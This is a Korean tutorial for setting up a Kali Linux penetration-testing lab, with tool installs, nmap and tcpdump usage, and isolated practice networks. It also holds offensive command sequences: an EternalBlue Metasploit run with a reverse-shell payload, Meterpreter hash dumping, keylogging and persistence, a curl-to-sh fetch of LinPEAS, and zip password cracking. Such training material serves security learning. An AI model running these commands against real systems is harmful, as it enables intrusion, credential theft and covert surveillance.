# Kali Linux 설치 및 초기 설정 완전 가이드

## 1. 설치 후 필수 초기 작업

### 시스템 업데이트
```bash
apt-get update && apt-get upgrade -y
apt-get dist-upgrade -y
apt-get autoremove -y
```

### VMware Tools 설치
```bash
# VMware 환경
apt-get install open-vm-tools open-vm-tools-desktop -y
```

### VirtualBox Guest Additions 설치
```bash
# 1. 먼저 ISO를 CD-ROM으로 마운트
cp /media/cdrom/VBoxLinuxAdditions.run ~
chmod +x ~/VBoxLinuxAdditions.run
./VBoxLinuxAdditions.run
reboot
```

---

## 2. 한국어 입력 설정

```bash
apt-get install nabi -y
apt-get install im-switch -y
im-switch -s nabi
im-switch -c
reboot
# 부팅 후 Shift + Space 로 한/영 전환
```

---

## 3. 기본 보안 도구 설치

### 네트워크 분석
```bash
apt-get install -y \
  nmap \
  masscan \
  wireshark \
  tcpdump \
  netcat-traditional \
  socat \
  hping3 \
  arpspoof \
  ettercap-text-only
```

### 웹 해킹
```bash
apt-get install -y \
  burpsuite \
  sqlmap \
  nikto \
  dirb \
  gobuster \
  wfuzz \
  whatweb \
  wafw00f
```

### 패스워드 크랙
```bash
apt-get install -y \
  john \
  hashcat \
  hydra \
  medusa \
  crunch \
  cewl \
  ophcrack
```

### 익스플로잇 프레임워크
```bash
# Metasploit Framework는 Kali에 기본 설치됨
msfupdate                    # DB 업데이트
service postgresql start     # DB 시작
msfdb init                   # MSF DB 초기화
msfconsole                   # MSF 실행
```

### 무선 해킹
```bash
apt-get install -y \
  aircrack-ng \
  reaver \
  pixiewps \
  wifite \
  bettercap
```

---

## 4. 편의성 설정

### .bashrc 커스터마이징
```bash
cat >> ~/.bashrc << 'EOF'

# 컬러 프롬프트
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '

# 유용한 alias
alias ll='ls -alh'
alias la='ls -A'
alias ..='cd ..'
alias ...='cd ../..'
alias grep='grep --color=auto'
alias ports='netstat -tuln'
alias myip='curl -s ifconfig.me'
alias update='apt-get update && apt-get upgrade -y'

# 히스토리 설정
HISTSIZE=10000
HISTFILESIZE=20000
HISTTIMEFORMAT="%F %T "

EOF
source ~/.bashrc
```

### Vim 설정
```bash
cat > ~/.vimrc << 'EOF'
syntax on
set number
set tabstop=4
set shiftwidth=4
set expandtab
set autoindent
set hlsearch
set incsearch
set ignorecase
set smartcase
set background=dark
colorscheme desert
EOF
```

---

## 5. Metasploit Framework 기본 사용법

### 초기 설정
```bash
service postgresql start
msfdb init
msfconsole
```

### 기본 명령어
```
msf6 > help                  # 도움말
msf6 > search type:exploit   # 모듈 검색
msf6 > search ms17-010       # EternalBlue 검색
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options          # 옵션 확인
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 192.168.1.50
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > run                   # 공격 실행
```

### Meterpreter 기본 명령어
```
meterpreter > sysinfo        # 시스템 정보
meterpreter > getuid         # 현재 사용자
meterpreter > getsystem      # 권한 상승 시도
meterpreter > hashdump       # 패스워드 해시 덤프
meterpreter > shell          # 쉘 획득
meterpreter > upload file.exe C:\\temp\\  # 파일 업로드
meterpreter > download C:\\passwords.txt  # 파일 다운로드
meterpreter > screenshot     # 스크린샷
meterpreter > keyscan_start  # 키로거 시작
meterpreter > keyscan_dump   # 키로거 내용 덤프
meterpreter > run persistence -U -i 5 -p 4444 -r LHOST  # 지속성 유지
```

---

## 6. Armitage (Metasploit GUI)

```bash
# 실행 순서
service postgresql start
msfdb init
armitage &

# Armitage 내 주요 기능
# Hosts > Nmap Scan → 대상 스캔
# Attacks > Find Attacks → 취약점 기반 자동 공격 목록
# 공격 후 Meterpreter 세션 GUI로 관리
```

---

## 7. Wireshark 설정

### 비루트 사용자로 Wireshark 사용
```bash
usermod -aG wireshark $USER
# 로그아웃 후 재로그인
```

### tcpdump 기본 사용법 (CLI)
```bash
tcpdump -i eth0                    # eth0 인터페이스 캡처
tcpdump -i eth0 port 80            # HTTP 트래픽만
tcpdump -i eth0 host 192.168.1.100  # 특정 호스트
tcpdump -i eth0 -w capture.pcap    # 파일로 저장
tcpdump -r capture.pcap            # 저장된 파일 읽기
tcpdump -i eth0 -n -nn             # IP/포트를 숫자로 표시
tcpdump -i eth0 'tcp flags & (rst|syn) != 0'  # SYN/RST 패킷만
```

---

## 8. 포트 스캔 기초 (Nmap)

```bash
nmap -sn 192.168.1.0/24            # 호스트 탐지 (ping scan)
nmap -sS 192.168.1.100             # SYN 스캔 (stealth)
nmap -sT 192.168.1.100             # TCP 연결 스캔
nmap -sU 192.168.1.100             # UDP 스캔
nmap -p 1-65535 192.168.1.100      # 전체 포트 스캔
nmap -A 192.168.1.100              # 종합 스캔 (OS, 버전, 스크립트)
nmap -O 192.168.1.100              # OS 탐지
nmap -sV 192.168.1.100             # 서비스 버전 탐지
nmap --script vuln 192.168.1.100   # 취약점 스크립트 실행
nmap -sS -T4 -A -v 192.168.1.0/24  # 빠른 종합 스캔
```

---

## 9. 권장 학습 환경 구성

| 가상머신 | 역할 | 권장 OS |
|---------|------|---------|
| Attacker | 공격자 머신 | Kali Linux |
| Target-1 | 취약한 리눅스 서버 | Metasploitable2 |
| Target-2 | 취약한 윈도우 서버 | Windows Server 2008 (패치 없음) |
| Web Target | 웹 취약점 실습 | DVWA, WebGoat |

### 네트워크 설정
- 모든 VM을 **Host-only** 또는 **Internal Network**로 설정
- 인터넷 차단으로 안전한 실습 환경 구성
- 공격자 머신과 타겟이 같은 네트워크 대역 사용

---

## 10. Kali 필수 명령어 카테고리 정리

### 정보 수집 (Information Gathering)
```bash
nmap           # 포트 스캔, 서비스 탐지
masscan        # 초고속 포트 스캔 (인터넷 규모)
theHarvester   # 이메일/도메인 OSINT
recon-ng       # 모듈형 정찰 프레임워크
maltego        # 그래프 기반 OSINT
dnsenum        # DNS 열거
dnsrecon       # DNS 정찰
fierce         # DNS 브루트포스
shodan         # 인터넷 장치 검색
```

### 취약점 스캔 (Vulnerability Analysis)
```bash
nessus         # 상용 취약점 스캐너 (평가판)
openvas        # 오픈소스 취약점 스캐너
nikto          # 웹 서버 취약점 스캔
wpscan         # WordPress 취약점 스캔
joomscan       # Joomla 취약점 스캔
lynis          # 리눅스 시스템 보안 감사
```

### 웹 애플리케이션 (Web Application)
```bash
burpsuite      # 웹 프록시 및 스캐너
zaproxy        # OWASP ZAP (오픈소스 웹 스캐너)
sqlmap         # SQL 인젝션 자동화
dirb           # 웹 디렉토리 브루트포스
gobuster       # 고성능 디렉토리/서브도메인 스캔
ffuf           # 고성능 웹 퍼저
wfuzz          # 웹 퍼저
commix         # 커맨드 인젝션 도구
whatweb        # 웹 기술 스택 탐지
```

### 패스워드 공격 (Password Attacks)
```bash
john           # John the Ripper (오프라인 크랙)
hashcat        # GPU 기반 해시 크랙
hydra          # 온라인 브루트포스 (다중 프로토콜)
medusa         # 병렬 로그인 브루트포서
ncrack         # 네트워크 인증 크래킹
crunch         # 커스텀 워드리스트 생성
cewl           # 웹 페이지 기반 워드리스트 생성
```

### 익스플로잇 (Exploitation)
```bash
msfconsole     # Metasploit Framework
searchsploit   # Exploit-DB 오프라인 검색
armitage       # Metasploit GUI
beef           # 브라우저 익스플로잇 프레임워크
```

### 스니핑 & 스푸핑 (Sniffing & Spoofing)
```bash
wireshark      # GUI 패킷 분석
tcpdump        # CLI 패킷 캡처
ettercap       # 중간자 공격 (MITM)
bettercap      # 고급 MITM 프레임워크
arpspoof       # ARP 스푸핑
dsniff         # 패스워드 스니핑 도구 모음
```

### 무선 해킹 (Wireless)
```bash
aircrack-ng    # WEP/WPA 크랙 스위트
airodump-ng    # 무선 네트워크 패킷 캡처
aireplay-ng    # 패킷 인젝션 (deauth 등)
airmon-ng      # 모니터 모드 관리
reaver         # WPS 브루트포스
wifite         # 자동화 무선 공격
kismet         # 무선 IDS/탐지
```

### 포스트 익스플로잇 (Post Exploitation)
```bash
# Meterpreter 세션에서
getsystem      # 권한 상승
hashdump       # 해시 추출
run post/multi/recon/local_exploit_suggester  # 권한 상승 제안

# LinPEAS — 리눅스 권한 상승 자동 탐색
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum — 리눅스 열거 스크립트
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

### 포렌식 (Forensics)
```bash
autopsy        # 디지털 포렌식 GUI
volatility     # 메모리 포렌식
foremost       # 파일 카빙
dd             # 디스크 이미징
md5sum/sha256sum  # 무결성 검증
strings        # 바이너리에서 문자열 추출
binwalk        # 펌웨어 분석
```

---

## 11. BackTrack/Kali 침투 테스팅 단계

```
침투 테스팅 표준 단계:
1. 정보수집 (Information Gathering)
   - Web 검색엔진 활용 (Google Dorks, Harvester)
   - DNS 정보 수집 (NSlookup, dig, dnsenum, fierce)
   - SNMP 정보 수집 (SNMPcheck, Onesixtyone)
   - ICMP 정보 수집 (Scapy, traceroute)
   - Whois / Netcraft / Host 정보 수집

2. 스캐닝 (Scanning)
   - 포트 스캔 (Nmap, Masscan)
   - 서비스 버전 탐지
   - OS 핑거프린팅

3. 취약점 분석 (Vulnerability Analysis)
   - Metasploit search 모듈
   - Nessus / OpenVAS

4. 익스플로잇 (Exploitation)
   - Metasploit Framework
   - Armitage (GUI)

5. 포스트 익스플로잇 (Post Exploitation)
   - Meterpreter 세션 활용
   - 권한 상승 / 지속성 유지
```

### BackTrack → Kali Linux 전환 이력
```
BackTrack 5 r3 → Kali Linux 1.0 (2013)
- BackTrack은 Ubuntu 기반
- Kali Linux는 Debian 기반으로 전환
- 패키지 관리: apt-get (동일)
- 도구 구성: 대부분 동일하나 경로/명령어 일부 변경
```

---

## 12. fcrackzip — 압축파일 비밀번호 크랙

```bash
# 설치
apt-get install fcrackzip

# 옵션
# -b  : 무차별대입 (brute force)
# -D  : 사전파일 사용 (dictionary attack)
# -c  : 문자 집합 지정
#        a = 소문자, A = 대문자, 1 = 숫자, ! = 특수문자
# -l  : 글자 수 범위 (예: 4-9 = 4~9자)
# -u  : 틀린 패스워드 제외
# -v  : 상세 출력
# -p  : 사전파일 경로 지정 (dictionary 모드)

# 무차별대입 (소문자+숫자, 4~9자)
fcrackzip -b -v -l 4-9 -c a1 -u target.zip

# 사전파일 공격
fcrackzip -D -p wordlist.txt -u target.zip
```

---

## 13. IP 네트워크 설정 (실습 환경)

### 정적 IP 설정 (Kali Linux)
```bash
# /etc/network/interfaces 편집 방식
auto eth0
iface eth0 inet static
    address 192.168.1.100
    netmask 255.255.255.0
    gateway 192.168.1.1
    dns-nameservers 8.8.8.8 8.8.4.4

# 적용
service networking restart
# 또는
ifdown eth0 && ifup eth0
```

### nmcli (NetworkManager CLI)
```bash
# 현재 연결 확인
nmcli con show

# 정적 IP 설정
nmcli con mod "Wired connection 1" \
    ipv4.method manual \
    ipv4.addresses "192.168.1.100/24" \
    ipv4.gateway "192.168.1.1" \
    ipv4.dns "8.8.8.8"

# 연결 재시작
nmcli con up "Wired connection 1"

# DHCP로 전환
nmcli con mod "Wired connection 1" ipv4.method auto
```

### 멀티 네트워크 인터페이스 설정
```bash
# VMware 환경에서 두 NIC 설정
# eth0: NAT (인터넷 접속)
# eth1: Host-only (실습 네트워크)

ip addr add 192.168.56.100/24 dev eth1
ip link set eth1 up

# 라우팅 확인
ip route show
```
